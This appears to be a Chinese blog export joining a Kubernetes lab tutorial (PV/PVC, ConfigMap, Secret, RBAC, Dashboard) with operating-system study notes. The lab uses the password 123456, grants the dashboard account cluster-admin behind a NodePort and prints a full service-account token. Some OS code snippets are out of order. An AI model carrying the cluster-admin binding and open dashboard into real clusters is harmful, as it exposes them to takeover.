/root/data/pv2/out.txtnode2node2 生命周期PVC和PV是一一对应的，PV和PVC之间的相互作用遵循以下生命周期： 资源供应：管理员手动创建底层存储和PV 资源绑定：用户创建PVC，kubernetes负责根据PVC的声明去寻找PV，并绑定 在用户定义好PVC之后，系统将根据PVC对存储资源的请求在已存在的PV中选择一个满足条件的 一旦找到，就将该PV与用户定义的PVC进行绑定，用户的应用就可以使用这个PVC了 如果找不到，PVC则会无限期处于Pending状态，直到等到系统管理员创建了一个符合其要求的PV PV一旦绑定到某个PVC上，就会被这个PVC独占，不能再与其他PVC进行绑定了 资源使用：用户可在pod中像volume一样使用pvc Pod使用Volume的定义，将PVC挂载到容器内的某个路径进行使用。 资源释放：用户删除pvc来释放pv 当存储资源使用完毕后，用户可以删除PVC，与该PVC绑定的PV将会被标记为“已释放”，但还不能立刻与其他PVC进行绑定。通过之前PVC写入的数据可能还被留在存储设备上，只有在清除之后该PV才能再次使用。 资源回收：kubernetes根据pv设置的回收策略进行资源的回收 对于PV，管理员可以设定回收策略，用于设置与之绑定的PVC释放资源之后如何处理遗留数据的问题。只有PV的存储空间完成回收，才能供新的PVC绑定和使用 配置存储ConfigMapConfigMap是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。 创建configmap.yaml，内容如下： 123456789apiVersion: v1kind: ConfigMapmetadata: name: configmap namespace: devdata: info: | username:admin password:123456 接下来，使用此配置文件创建configmap 12345678910111213141516171819# 创建configmap[root@k8s-master01 ~]# kubectl create -f configmap.yamlconfigmap/configmap created# 查看configmap详情[root@k8s-master01 ~]# kubectl describe cm configmap -n devName: configmapNamespace: devLabels: &lt;none&gt;Annotations: &lt;none&gt;Data====info:----username:adminpassword:123456Events: &lt;none&gt; 接下来创建一个pod-configmap.yaml，将上面创建的configmap挂载进去 12345678910111213141516apiVersion: v1kind: Podmetadata: name: pod-configmap namespace: devspec: containers: - name: nginx image: nginx:1.17.1 volumeMounts: # 将configmap挂载到目录 - name: config mountPath: /configmap/config volumes: # 引用configmap - name: config configMap: name: configmap 123456789101112131415161718192021# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-configmap.yamlpod/pod-configmap created# 查看pod[root@k8s-master01 ~]# kubectl get pod pod-configmap -n devNAME READY STATUS RESTARTS AGEpod-configmap 1/1 Running 0 6s#进入容器[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh# cd /configmap/config/# lsinfo# more infousername:adminpassword:123456# 可以看到映射已经成功，每个configmap都映射成了一个目录# key---&gt;文件 value----&gt;文件中的内容# 此时如果更新configmap的内容, 容器中的值也会动态更新 Secret在kubernetes中，还存在一种和ConfigMap非常类似的对象，称为Secret对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。 首先使用base64对数据进行编码 1234[root@k8s-master01 ~]# echo -n 'admin' | base64 #准备usernameYWRtaW4=[root@k8s-master01 ~]# echo -n '123456' | base64 #准备passwordMTIzNDU2 接下来编写secret.yaml，并创建Secret 123456789apiVersion: v1kind: Secretmetadata: name: secret namespace: devtype: Opaquedata: username: YWRtaW4= password: MTIzNDU2 123456789101112131415# 创建secret[root@k8s-master01 ~]# kubectl create -f secret.yamlsecret/secret created# 查看secret详情[root@k8s-master01 ~]# kubectl describe secret secret -n devName: secretNamespace: devLabels: &lt;none&gt;Annotations: &lt;none&gt;Type: OpaqueData====password: 6 bytesusername: 5 bytes 创建pod-secret.yaml，将上面创建的secret挂载进去： 12345678910111213141516apiVersion: v1kind: Podmetadata: name: pod-secret namespace: devspec: containers: - name: nginx image: nginx:1.17.1 volumeMounts: # 将secret挂载到目录 - name: config mountPath: /secret/config volumes: - name: config secret: secretName: secret 1234567891011121314151617# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-secret.yamlpod/pod-secret created# 查看pod[root@k8s-master01 ~]# kubectl get pod pod-secret -n devNAME READY STATUS RESTARTS AGEpod-secret 1/1 Running 0 2m28s# 进入容器，查看secret信息，发现已经自动解码了[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev/ # ls /secret/config/password username/ # more /secret/config/usernameadmin/ # more /secret/config/password123456 至此，已经实现了利用secret实现了信息的编码。 安全认证访问控制概述Kubernetes作为一个分布式集群的管理工具，保证集群的安全性是其一个重要的任务。所谓的安全性其实就是保证对Kubernetes的各种客户端进行认证和鉴权操作。 客户端 在Kubernetes集群中，客户端通常有两类： User Account：一般是独立于kubernetes之外的其他服务管理的用户账号。 Service Account：kubernetes管理的账号，用于为Pod中的服务进程在访问Kubernetes时提供身份标识。 认证、授权与准入控制 ApiServer是访问及管理资源对象的唯一入口。任何一个请求访问ApiServer，都要经过下面三个流程： Authentication（认证）：身份鉴别，只有正确的账号才能够通过认证 Authorization（授权）： 判断用户是否有权限对访问的资源执行特定的动作 Admission Control（准入控制）：用于补充授权机制以实现更加精细的访问控制功能。 认证管理Kubernetes集群安全的最关键点在于如何识别并认证客户端身份，它提供了3种客户端身份认证方式： HTTP Base认证：通过用户名+密码的方式认证 1这种认证方式是把“用户名:密码”用BASE64算法进行编码后的字符串放在HTTP请求中的Header Authorization域里发送给服务端。服务端收到后进行解码，获取用户名及密码，然后进行用户身份认证的过程。 HTTP Token认证：通过一个Token来识别合法用户 1这种认证方式是用一个很长的难以被模仿的字符串--Token来表明客户身份的一种方式。每个Token对应一个用户名，当客户端发起API调用请求时，需要在HTTP Header里放入Token，API Server接到Token后会跟服务器中保存的token进行比对，然后进行用户身份认证的过程。 HTTPS证书认证：基于CA根证书签名的双向数字证书认证方式 1这种认证方式是安全性最高的一种方式，但是同时也是操作起来最麻烦的一种方式。 HTTPS认证大体分为3个过程： 证书申请和下发 1HTTPS通信双方的服务器向CA机构申请证书，CA机构下发根证书、服务端证书及私钥给申请者 客户端和服务端的双向认证 123451&gt; 客户端向服务器端发起请求，服务端下发自己的证书给客户端， 客户端接收到证书后，通过私钥解密证书，在证书中获得服务端的公钥， 客户端利用服务器端的公钥认证证书中的信息，如果一致，则认可这个服务器2&gt; 客户端发送自己的证书给服务器端，服务端接收到证书后，通过私钥解密证书， 在证书中获得客户端的公钥，并用该公钥认证证书信息，确认客户端是否合法 服务器端和客户端进行通信 12服务器端和客户端协商好加密方案后，客户端会产生一个随机的秘钥并加密，然后发送到服务器端。服务器端接收这个秘钥后，双方接下来通信的所有内容都通过该随机秘钥加密 注意: Kubernetes允许同时配置多种认证方式，只要其中任意一个方式认证通过即可 授权管理授权发生在认证成功之后，通过认证就可以知道请求用户是谁， 然后Kubernetes会根据事先定义的授权策略来决定用户是否有权限访问，这个过程就称为授权。 每个发送到ApiServer的请求都带上了用户和资源的信息：比如发送请求的用户、请求的路径、请求的动作等，授权就是根据这些信息和授权策略进行比较，如果符合策略，则认为授权通过，否则会返回错误。 API Server目前支持以下几种授权策略： AlwaysDeny：表示拒绝所有请求，一般用于测试 AlwaysAllow：允许接收所有请求，相当于集群不需要授权流程（Kubernetes默认的策略） ABAC：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制 Webhook：通过调用外部REST服务对用户进行授权 Node：是一种专用模式，用于对kubelet发出的请求进行访问控制 RBAC：基于角色的访问控制（kubeadm安装方式下的默认选项） RBAC(Role-Based Access Control) 基于角色的访问控制，主要是在描述一件事情：给哪些对象授予了哪些权限 其中涉及到了下面几个概念： 对象：User、Groups、ServiceAccount 角色：代表着一组定义在资源上的可操作动作(权限)的集合 绑定：将定义好的角色跟用户绑定在一起 RBAC引入了4个顶级资源对象： Role、ClusterRole：角色，用于指定一组权限 RoleBinding、ClusterRoleBinding：角色绑定，用于将角色（权限）赋予给对象 Role、ClusterRole 一个角色就是一组权限的集合，这里的权限都是许可形式的（白名单）。 12345678910# Role只能对命名空间内的资源进行授权，需要指定nameapcekind: RoleapiVersion: rbac.authorization.k8s.io/v1beta1metadata: namespace: dev name: authorization-rolerules:- apiGroups: [&quot;&quot;] # 支持的API组列表,&quot;&quot; 空字符串，表示核心API群 resources: [&quot;pods&quot;] # 支持的资源对象列表 verbs: [&quot;get&quot;, &quot;watch&quot;, &quot;list&quot;] # 允许的对资源对象的操作方法列表 123456789# ClusterRole可以对集群范围内资源、跨namespaces的范围资源、非资源类型进行授权kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1beta1metadata: name: authorization-clusterrolerules:- apiGroups: [&quot;&quot;] resources: [&quot;pods&quot;] verbs: [&quot;get&quot;, &quot;watch&quot;, &quot;list&quot;] 需要详细说明的是，rules中的参数： apiGroups: 支持的API组列表 1&quot;&quot;,&quot;apps&quot;, &quot;autoscaling&quot;, &quot;batch&quot; resources：支持的资源对象列表 123&quot;services&quot;, &quot;endpoints&quot;, &quot;pods&quot;,&quot;secrets&quot;,&quot;configmaps&quot;,&quot;crontabs&quot;,&quot;deployments&quot;,&quot;jobs&quot;,&quot;nodes&quot;,&quot;rolebindings&quot;,&quot;clusterroles&quot;,&quot;daemonsets&quot;,&quot;replicasets&quot;,&quot;statefulsets&quot;,&quot;horizontalpodautoscalers&quot;,&quot;replicationcontrollers&quot;,&quot;cronjobs&quot; verbs：对资源对象的操作方法列表 1&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;, &quot;delete&quot;, &quot;exec&quot; RoleBinding、ClusterRoleBinding 角色绑定用来把一个角色绑定到一个目标对象上，绑定目标可以是User、Group或者ServiceAccount。 1234567891011121314# RoleBinding可以将同一namespace中的subject绑定到某个Role下，则此subject即具有该Role定义的权限kind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1beta1metadata: name: authorization-role-binding namespace: devsubjects:- kind: User name: heima apiGroup: rbac.authorization.k8s.ioroleRef: kind: Role name: authorization-role apiGroup: rbac.authorization.k8s.io 12345678910111213# ClusterRoleBinding在整个集群级别和所有namespaces将特定的subject与ClusterRole绑定，授予权限kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1beta1metadata: name: authorization-clusterrole-bindingsubjects:- kind: User name: heima apiGroup: rbac.authorization.k8s.ioroleRef: kind: ClusterRole name: authorization-clusterrole apiGroup: rbac.authorization.k8s.io RoleBinding引用ClusterRole进行授权 RoleBinding可以引用ClusterRole，对属于同一命名空间内ClusterRole定义的资源主体进行授权。 1一种很常用的做法就是，集群管理员为集群范围预定义好一组角色（ClusterRole），然后在多个命名空间中重复使用这些ClusterRole。这样可以大幅提高授权管理工作效率，也使得各个命名空间下的基础性授权规则与使用体验保持一致。 123456789101112131415# 虽然authorization-clusterrole是一个集群角色，但是因为使用了RoleBinding# 所以heima只能读取dev命名空间中的资源kind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1beta1metadata: name: authorization-role-binding-ns namespace: devsubjects:- kind: User name: heima apiGroup: rbac.authorization.k8s.ioroleRef: kind: ClusterRole name: authorization-clusterrole apiGroup: rbac.authorization.k8s.io 实战：创建一个只能管理dev空间下Pods资源的账号 创建账号 12345678910111213141516171819202122232425262728# 1) 创建证书[root@k8s-master01 pki]# cd /etc/kubernetes/pki/[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)# 2) 用apiserver的证书去签署# 2-1) 签名申请，申请的用户是devman,组是devgroup[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj &quot;/CN=devman/O=devgroup&quot; # 2-2) 签署证书[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out devman.crt -days 3650# 3) 设置集群、用户、上下文信息[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman# 切换账户到devman[root@k8s-master01 pki]# kubectl config use-context devman@kubernetesSwitched to context &quot;devman@kubernetes&quot;.# 查看dev下pod，发现没有权限[root@k8s-master01 pki]# kubectl get pods -n devError from server (Forbidden): pods is forbidden: User &quot;devman&quot; cannot list resource &quot;pods&quot; in API group &quot;&quot; in the namespace &quot;dev&quot;# 切换到admin账户[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetesSwitched to context &quot;kubernetes-admin@kubernetes&quot;. 2） 创建Role和RoleBinding，为devman用户授权 12345678910111213141516171819202122232425kind: RoleapiVersion: rbac.authorization.k8s.io/v1beta1metadata: namespace: dev name: dev-rolerules:- apiGroups: [&quot;&quot;] resources: [&quot;pods&quot;] verbs: [&quot;get&quot;, &quot;watch&quot;, &quot;list&quot;] ---kind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1beta1metadata: name: authorization-role-binding namespace: devsubjects:- kind: User name: devman apiGroup: rbac.authorization.k8s.ioroleRef: kind: Role name: dev-role apiGroup: rbac.authorization.k8s.io 123[root@k8s-master01 pki]# kubectl create -f dev-role.yamlrole.rbac.authorization.k8s.io/dev-role createdrolebinding.rbac.authorization.k8s.io/authorization-role-binding created 切换账户，再次验证 1234567891011121314# 切换账户到devman[root@k8s-master01 pki]# kubectl config use-context devman@kubernetesSwitched to context &quot;devman@kubernetes&quot;.# 再次查看[root@k8s-master01 pki]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEnginx-deployment-66cb59b984-8wp2k 1/1 Running 0 4d1hnginx-deployment-66cb59b984-dc46j 1/1 Running 0 4d1hnginx-deployment-66cb59b984-thfck 1/1 Running 0 4d1h# 为了不影响后面的学习,切回admin账户[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetesSwitched to context &quot;kubernetes-admin@kubernetes&quot;. 准入控制通过了前面的认证和授权之后，还需要经过准入控制处理通过之后，apiserver才会处理这个请求。 准入控制是一个可配置的控制器列表，可以通过在Api-Server上通过命令行设置选择执行哪些准入控制器： 12--admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel, DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds 只有当所有的准入控制器都检查通过之后，apiserver才执行该请求，否则返回拒绝。 当前可配置的Admission Control准入控制如下： AlwaysAdmit：允许所有请求 AlwaysDeny：禁止所有请求，一般用于测试 AlwaysPullImages：在启动容器之前总去下载镜像 DenyExecOnPrivileged：它会拦截所有想在Privileged Container上执行命令的请求 ImagePolicyWebhook：这个插件将允许后端的一个Webhook程序来完成admission controller的功能。 Service Account：实现ServiceAccount实现了自动化 SecurityContextDeny：这个插件将使用SecurityContext的Pod中的定义全部失效 ResourceQuota：用于资源配额管理目的，观察所有请求，确保在namespace上的配额不会超标 LimitRanger：用于资源限制管理，作用于namespace上，确保对Pod进行资源限制 InitialResources：为未设置资源请求与限制的Pod，根据其镜像的历史资源的使用情况进行设置 NamespaceLifecycle：如果尝试在一个不存在的namespace中创建资源对象，则该创建请求将被拒绝。当删除一个namespace时，系统将会删除该namespace中所有对象。 DefaultStorageClass：为了实现共享存储的动态供应，为未指定StorageClass或PV的PVC尝试匹配默认的StorageClass，尽可能减少用户在申请PVC时所需了解的后端存储细节 DefaultTolerationSeconds：这个插件为那些没有设置forgiveness tolerations并具有notready:NoExecute和unreachable:NoExecute两种taints的Pod设置默认的“容忍”时间，为5min PodSecurityPolicy：这个插件用于在创建或修改Pod时决定是否根据Pod的security context和可用的PodSecurityPolicy对Pod的安全策略进行控制 DashBoard之前在kubernetes中完成的所有操作都是通过命令行工具kubectl完成的。其实，为了提供更丰富的用户体验，kubernetes还开发了一个基于web的用户界面（Dashboard）。用户可以使用Dashboard部署容器化的应用，还可以监控应用的状态，执行故障排查以及管理kubernetes中各种资源。 部署Dashboard 下载yaml，并运行Dashboard 1234567891011121314151617181920212223242526272829303132# 下载yaml[root@k8s-master01 ~]# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml# 修改kubernetes-dashboard的Service类型kind: ServiceapiVersion: v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardspec: type: NodePort # 新增 ports: - port: 443 targetPort: 8443 nodePort: 30009 # 新增 selector: k8s-app: kubernetes-dashboard# 部署[root@k8s-master01 ~]# kubectl create -f recommended.yaml# 查看namespace下的kubernetes-dashboard下的资源[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboardNAME READY STATUS RESTARTS AGEpod/dashboard-metrics-scraper-c79c65bb7-zwfvw 1/1 Running 0 111spod/kubernetes-dashboard-56484d4c5-z95z5 1/1 Running 0 111sNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/dashboard-metrics-scraper ClusterIP 10.96.89.218 &lt;none&gt; 8000/TCP 111sservice/kubernetes-dashboard NodePort 10.104.178.171 &lt;none&gt; 443:30009/TCP 111s 2）创建访问账户，获取token 123456789101112131415161718192021222324# 创建账号[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard# 授权[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin# 获取账号token[root@k8s-master01 ~]# kubectl get secrets -n kubernetes-dashboard | grep dashboard-admindashboard-admin-token-xbqhh kubernetes.io/service-account-token 3 2m35s[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboardName: dashboard-admin-token-xbqhhNamespace: kubernetes-dashboardLabels: &lt;none&gt;Annotations: kubernetes.io/service-account.name: dashboard-admin kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039Type: kubernetes.io/service-account-tokenData====namespace: 20 bytestoken: eyJhbGciOiJSUzI1NiIsImtpZCI6ImJrYkF4bW5XcDhWcmNGUGJtek5NODFuSXl1aWptMmU2M3o4LTY5a2FKS2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4teGJxaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOTVkODRkODAtYmU3YS00ZDEwLWEyZTAtNjhmOTAyMjJkMDM5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.NAl7e8ZfWWdDoPxkqzJzTB46sK9E8iuJYnUI9vnBaY3Jts7T1g1msjsBnbxzQSYgAG--cV0WYxjndzJY_UWCwaGPrQrt_GunxmOK9AUnzURqm55GR2RXIZtjsWVP2EBatsDgHRmuUbQvTFOvdJB4x3nXcYLN2opAaMqg3rnU2rr-A8zCrIuX_eca12wIp_QiuP3SF-tzpdLpsyRfegTJZl6YnSGyaVkC9id-cxZRb307qdCfXPfCHR_2rt5FVfxARgg_C0e3eFHaaYQO7CitxsnIoIXpOFNAR8aUrmopJyODQIPqBWUehb7FhlU1DCduHnIIXVC_UICZ-MKYewBDLwca.crt: 1025 bytes 3）通过浏览器访问Dashboard的UI 在登录页面上输入上面的token 出现下面的页面代表成功 使用DashBoard本章节以Deployment为例演示DashBoard的使用 查看 选择指定的命名空间dev，然后点击Deployments，查看dev空间下的所有deployment 扩缩容 在Deployment上点击规模，然后指定目标副本数量，点击确定 编辑 在Deployment上点击编辑，然后修改yaml文件，点击确定 查看Pod 点击Pods, 查看pods列表 操作Pod 选中某个Pod，可以对其执行日志（logs）、进入执行（exec）、编辑、删除操作 Dashboard提供了kubectl的绝大部分功能，这里不再一一演示","link":"/2023/04/18/Kubernetes/"},{"title":"操作系统","text":"操作系统基础知识 进程、线程、协程进程是系统资源分配和调度的最小单位、线程是操作系统分配和调度的最小单位线程分成更小的协程，多个协程共享一个线程。线程切换是一个操作系统层面的行为，要关中断、保存断点、终端服务寻址、开中断执行服务协程间切换是runtime的 行为 操作系统运行机制 时钟管理 中断机制 外中断：中断信号来源于外部设备（被迫的） 内中断：中断信号来源于当前指令（自愿的）： 陷入指令（应用程序引发的，cpu产生），比如程序执行到某处需要进行读文件操作，cpu从用户态切换到内核态 内存缺页中断 原语（原语的底层实现就是靠开中断和关中断实现的） 若干条指令组成 完成某个特定功能 执行过程不会被中断（具有原子性） 系统数据结构 进程管理：作业控制快、进程控制块 存储器管理：存储器分配与回收 设备管理：缓冲区、设备控制快 系统调用（应用程序去访问操作系统内核的时候） 一套接口的集合 应用程序去访问操作系统内核服务的方式 操作系统PCB:为了描述控制进程的运行，系统中存放进程的管理和控制信息的数据结构称为进程控制块（PCB Process Control Block），它是进程实体的一部分，是操作系统中最重要的记录性数据结构。它是进程管理和控制的最重要的数据结构，每一个进程均有一个PCB，在创建进程时，建立PCB，伴随进程运行的全过程，直到进程撤消而撤消。寄存器里面放的是有些程序运行计算了一半被抢占了，记录执行的位置，下次执行可以接着中间数据往下执行 进程的状态 其实是七状态，还有阻塞挂起和就绪挂起 进程间通信共享存储：共享空间对于多个进程访问是互斥的 管道通信：没写满的时候是不允许读的，没读完也是不允许写的。 消息队列：消息头里包含了传递信息，不会传错给别的进程 信号套接字 socket线程 线程的实现方式（用户级线程、内核级线程、组合方式） 多线程模型：多对一、一对多n个用户级线程映射到内核级线程上 处理机调度（线程调度） 进程同步 **互斥量(Mutex)**：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问。比如 Java 中的 synchronized 关键词和各种 Lock 都是这种机制。 信号量(Semaphore) ：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量。 事件(Event) :Wait/Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作。 临界区：拥有临界区的线程可以访问被保护资源，其他访问会被挂起。 双标志前检查法：先检查其他进程是否想要临界区，再上锁 双标志后检查法：先上锁在检查其他进程是否想要临界区 Peterson算法：双方都争着使用临界区的话，可以尝试让一方主动让对方先使用临界区 进程互斥 临界区冲突 空闲让进：一次进一个，进不来的挂起 忙则等待： 有限等待：有限时间内退出 让权等待：进程不能进入自己的临界区，则应该让出CPU，避免出现忙等现象 死锁 互斥条件：对必须互斥资源的争抢才会导致死锁 不剥夺条件：进程获得的资源在未使用完之前不能由其他进程强行夺走，只能主动释放 请求和保持条件：进程已经保持至少一个资源，但又提出了新的资源请求，而该资源又被其他进程占有，此时请求被阻塞，但又对自己的资源保持不放 循环等待条件：存在资源的循环等待链 预防死锁 避免死锁（银行家算法） 内存 内存管理 覆盖技术下图A调用B、C是依次调用的，因此B、C可以共同使用程序X的覆盖区0（图中绿色），从逻辑上看，物理内存是被”拓展“了 交换技术 换入、换出 内存分配 管理方式（单一连续分配、固定分区分配方式) 分页不同的页面是离散地存放在内存中 页表每个进程都有自己的页表 问题：相当于把以前的页表查分成多个页表，并为多个页表加一个目录，叫做”页目录表“ 虚拟内存传统存储例如，GTA游戏一共60G，电脑是4G的，如果要玩的话需要全部加载到内存中，显然是不够的，但是我在A场景时只用放入A场景的资源就可以了，而这种传统方式会需要整个游戏全部加驻留在内存中。虚拟内存基于局部性原理 实现虚拟内存的技术请求分页存储管理 内存有空闲的情况 内存没空闲的情况 请求分段存储管理请求段页式存储管理页面替换算法最佳置换算法（OPT） 先进先出置换算法（FIFO） 最近最久未使用置换算法（LRU） 时钟置换算法（CLOCK） 内存块排布类似于循环链表 到6页面的时候，由于5个内存块都满了，就需要先箭头转一圈全部置为0，然后替换最开始的位置，后面用到的继续置为1，全为1的时候再转一圈变为0，然后又从队首开始替换。箭头扫描的过程有点像时钟转，故命名为时钟置换算法。改造型的时钟置换算法因为之前说到分页存储的时候，再替换过程中如果一个页面被修改过，则需要写入外存中去。这个时候给他加一个标记，被修改过的时候修改位标记为1。 磁盘结构 活动头磁盘、固定头磁盘 写磁盘需要的时间流程（寻道时间、延迟时间、传输时间） 磁盘调度算法先来先服务最短寻找时间优先 扫描算法 LOOK调度算法（扫描算法改进） 循环扫描算法（扫描算法改进）主要是各个磁道响应时间比较平均 C-LOOK调度算法 总结 减少磁盘延迟时间的方法交替编号：在读取连续扇区时，每读完一个扇区需要时间处理读取的内容，由于磁头还没有准备好，可能在处理过程中就错过了连续扇区的内容，这个时候需要再转一圈转到未读的地方，所以一般间隔编号依次交替解决问题 错位命名 IO select poll epoll 什么是操作系统？请简要概述一下操作系统是管理计算机硬件和软件资源的计算机程序，提供一个计算机用户与计算机硬件系统之间的接口。向上对用户程序提供接口，向下接管硬件资源。操作系统本质上也是一个软件，作为最接近硬件的系统软件，负责处理器管理、存储器管理、设备管理、文件管理和提供用户接口。 操作系统有哪些分类？操作系统常规可分为批处理操作系统、分时操作系统、实时操作系统。若一个操作系统兼顾批操作和分时的功能，则称该系统为通用操作系统。常见的通用操作系统有：Windows、Linux、MacOS等。 什么是内核态和用户态？为了避免操作系统和关键数据被用户程序破坏，将处理器的执行状态分为内核态和用户态。内核态是操作系统管理程序执行时所处的状态，能够执行包含特权指令在内的一切指令，能够访问系统内所有的存储空间。用户态是用户程序执行时处理器所处的状态，不能执行特权指令，只能访问用户地址空间。用户程序运行在用户态,操作系统内核运行在内核态。 如何实现内核态和用户态的切换？处理器从用户态切换到内核态的方法有三种：系统调用、异常和外部中断。 系统调用是操作系统的最小功能单位，是操作系统提供的用户接口，系统调用本身是一种软中断。 异常，也叫做内中断，是由错误引起的，如文件损坏、缺页故障等。 外部中断，是通过两根信号线来通知处理器外设的状态变化，是硬中断。 并发和并行的区别 并发（concurrency）：指宏观上看起来两个程序在同时运行，比如说在单核cpu上的多任务。但是从微观上看两个程序的指令是交织着运行的，指令之间交错执行，在单个周期内只运行了一个指令。这种并发并不能提高计算机的性能，只能提高效率（如降低某个进程的相应时间）。 并行（parallelism）：指严格物理意义上的同时运行，比如多核cpu，两个程序分别运行在两个核上，两者之间互不影响，单个周期内每个程序都运行了自己的指令，也就是运行了两条指令。这样说来并行的确提高了计算机的效率。所以现在的cpu都是往多核方面发展。 什么是进程？进程是操作系统中最重要的抽象概念之一，是资源分配的基本单位，是独立运行的基本单位。进程的经典定义就是一个执行中程序的实例。系统中的每个程序都运行在某个进程的上下文（context）中。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的程序的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。进程一般由以下的部分组成： 进程控制块PCB，是进程存在的唯一标志，包含进程标识符PID，进程当前状态，程序和数据地址，进程优先级、CPU现场保护区（用于进程切换），占有的资源清单等。 程序段 数据段 进程的基本操作以Unix系统举例： 进程的创建：fork()。新创建的子进程几乎但不完全与父进程相同。子进程得到与父进程用户级虚拟地址空间相同的(但是独立的)一份副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着当父进程调用 fork 时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的 PID。fork函数是有趣的（也常常令人迷惑）， 因为它只被调用一次，却会返回两次：一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中，fork 返回子进程的 PID。在子进程中，fork 返回 0。因为子进程的 PID 总是为非零，返回值就提供一个明 确的方法来分辨程序是在父进程还是在子进程中执行。 复制代码回收子进程：当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程回收（reaped）。当父进程回收已终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。一个进程可以通过调用 waitpid 函数来等待它的子进程终止或者停止。 1pid_t fork(void); 复制代码加载并运行程序：execve 函数在当前进程的上下文中加载并运行一个新程序。 复制代码进程终止： 1pid_t waitpid(pid_t pid, int *statusp, int options); 1int execve(const char *filename, const char *argv[], const char *envp[]); 复制代码 每个进程各自有不同的用户地址空间,任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程A把数据从用户空间拷到内核缓冲区,进程B再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信。 不同进程间的通信本质：进程之间可以看到一份公共资源；而提供这份资源的形式或者提供者不同，造成了通信方式不同。 进程间通信主要包括管道、系统IPC（包括消息队列、信号量、信号、共享内存等）、以及套接字socket。 管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质： 管道的原理: 管道实为内核使用环形队列机制，借助内核缓冲区实现。 管道的局限性： 它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据得更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。 特点： 一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件。Linux 系统上支持的30 种不同类型的信号。每种信号类型都对应于某种系统事件。低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的。信号提供了一种机制，通知用户进程发生了这些异常。复制代码进程在运行时有三种基本状态：就绪态、运行态和阻塞态。 2.就绪（ready）态：进程具备运行条件，等待系统分配处理器以便运行的状态。 当进程已分配到除CPU以外的所有必要资源后，只要再获得CPU，便可立即执行，进程这时的状态称为就绪状态。在一个系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为就绪队列。 